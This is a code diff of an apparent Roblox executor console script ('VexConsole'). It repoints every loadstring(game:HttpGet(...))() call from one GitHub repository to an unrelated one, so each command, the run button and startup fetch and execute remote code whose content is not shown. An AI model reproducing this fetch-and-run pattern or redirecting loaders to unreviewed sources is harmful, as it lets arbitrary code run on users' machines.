@@ -5,7 +5,7 @@ local function NewGui()
 		["cmds()"] = {
 			Description = "Shows every command avalable in the console",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 				local OutputMessage = "LIST OF COMMANDS:"
@@ -22,7 +22,7 @@ local function NewGui()
 		["clear()"] = {
 			Description = "Clears the console",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 
@@ -37,7 +37,7 @@ local function NewGui()
 		["resetvexhubfolder()"] = {
 			Description = "Resets your VexHub folder.",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 
@@ -53,7 +53,7 @@ local function NewGui()
 		["print"] = {
 			Description = "Basic print",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 				local StringTable = string.split(Text, " ")
@@ -77,7 +77,7 @@ local function NewGui()
 		["error"] = {
 			Description = "Basic print but red",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 				local StringTable = string.split(Text, " ")
@@ -101,7 +101,7 @@ local function NewGui()
 		["warn"] = {
 			Description = "Basic print but orange",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 				local StringTable = string.split(Text, " ")
@@ -125,7 +125,7 @@ local function NewGui()
 		["info"] = {
 			Description = "Basic print but blue",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 				local StringTable = string.split(Text, " ")
@@ -150,7 +150,7 @@ local function NewGui()
 		["/search <Message>"] = {
 			Description = "Searches the console containing the <Message>",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 				local StringTable = string.split(Text, " ")
@@ -208,7 +208,7 @@ local function NewGui()
 		["closesearch()"] = {
 			Description = "Closes the searching seasion",
 			Function = function(Text)
-				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+				local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 				local Commands = _G.Commands
 				local Outputs = game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole").MainFrame.BottomFrame.BottomFrame.ScrollingFrameParent.ScrollingFrame
 				local StringTable = string.split(Text, " ")
@@ -769,7 +769,7 @@ local function NewGui()
 	end)
 
 	RunButton.MouseButton1Down:Connect(function()
-		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 		local Commands = _G.Commands
 
 		Message:Input(CommandLineTextBox.Text)
@@ -815,7 +815,7 @@ local function NewGui()
 		end
 	end)
 
-	local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+	local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 
 	coroutine.wrap(function()
 		while task.wait() do
@@ -863,27 +863,27 @@ local function NewGui()
 
 	-- API:
 	getgenv().vprint = function(string)
-		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 		Message:Output(string)
 	end
 
 	getgenv().vsuccess = function(string)
-		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 		Message:Success(string)
 	end
 
 	getgenv().verror = function(string)
-		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 		Message:Error(string)
 	end
 
 	getgenv().vwarn = function(string)
-		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 		Message:Warning(string)
 	end
 
 	getgenv().vinfo = function(string)
-		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+		local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 		Message:Information(string)
 	end
 
@@ -899,7 +899,7 @@ end
 if not game:GetService("CoreGui"):FindFirstChild("VexDeveloperConsole") then
 	NewGui()
 	wait()
-	local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/On-Discord/Created/VexConsole"))()
+	local Message = loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiSource/pet/refs/heads/main/Con"))()
 	Message:Output("Type \"cmds()\" in the command line to view VexConsole commands!\n\nType \"/vexconsole\" in the chat or press the \"F8\" key in your keyboard or execute \"vconsole()\" in your executor to prompt the console!")
 end
 
